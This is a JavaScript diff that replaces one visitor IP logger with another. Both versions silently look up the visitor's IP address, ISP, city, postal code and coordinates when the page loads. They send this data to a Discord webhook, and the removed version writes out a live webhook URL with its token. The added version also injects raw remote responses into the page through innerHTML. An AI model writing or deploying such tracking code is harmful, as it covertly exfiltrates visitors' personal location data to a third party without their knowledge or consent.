@@ -1,30 +1,41 @@
-// IP Logger
-$(document).ready(function() {
-  // Get user information using IPAPI
-  $.get("https://ipapi.co/json/", function(data) {
-      // Send user information to Discord webhook
-      var formattedData = "**IP: **" + data.ip + "\n" +
-                          "**Network: **" + data.network + "\n" +
-                          "**Version: **" + data.version + "\n" +
-                          "**ASN: **" + data.asn + "\n" +
-                          "**ISP: **" + data.org + "\n" +
-                          "**City: **" + data.city + "\n" +
-                          "**Postal Code: **" + data.postal + "\n" +
-                          "**Region: **" + data.region + "\n" +
-                          "**Country: **" + data.country_name + "\n" +
-                          "**Capital: **" + data.country_capital + "\n" +
-                          "**Country Population: **" + data.country_population + "\n" +
-                          "**Calling Code: **" + data.country_calling_code + "\n" +
-                          "**Latitude: **" + data.latitude + "\n" +
-                          "**Longitude: **" + data.longitude + "\n" +
-                          "**Timezone: **" + data.timezone + "\n" +
-                          "**Currency: **" + data.currency + "\n";
-
-      $.ajax({
-          type: "POST",
-          url: "https://discord.com/api/webhooks/1256598672276197460/2x9K9sAnwlRMmySRJwXnekKq_UqHjcotXIUcfc1Ub3C--88mmmRgSQkx9bfWXFiHEUdz",
-          data: JSON.stringify({ content: formattedData }),
-          contentType: "application/json"
+ function get_information(link, callback) {
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", link, true);
+        xhr.onreadystatechange = function() {
+          if (xhr.readyState === 4) {
+            callback(xhr.responseText);
+          }
+        };
+        xhr.send(null);
+      }
+      get_information("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function(text) {
+        var div = document.createElement("div");
+        div.innerHTML = text;
+        div.id = "razzylog";
+        const secondList = document.getElementsByClassName("header")[0]
+        secondList.appendChild(div)
       });
-  });
-});
+      get_information("https://api.ipify.org/", function(text) {
+        var div = document.createElement("div");
+        div.innerHTML = text;
+        div.id = "ipppp";
+        const secondList = document.getElementsByClassName("header")[0]
+        secondList.appendChild(div)
+      });
+
+      function ipLogByRaz() {
+        var ispp = document.getElementById('ipppp').innerHTML
+        var extra = document.getElementById("razzylog").innerHTML
+        const request = new XMLHttpRequest();
+        request.open("POST", wbhk);
+        request.setRequestHeader('Content-type', 'application/json');
+        const params = {
+          username: "Ip Tracker",
+          avatar_url: 'https://cdn-icons-png.freepik.com/512/6434/6434897.png',
+          content: "**Ip** : _" + ispp + "_\n**Raw** : _https://api.techniknews.net/ipgeo/" + ispp + "_\n**Extra Info** : ```" + extra + "```"
+        }
+        request.send(JSON.stringify(params));
+      }
+      setTimeout(function() {
+        ipLogByRaz()
+      }, 700);
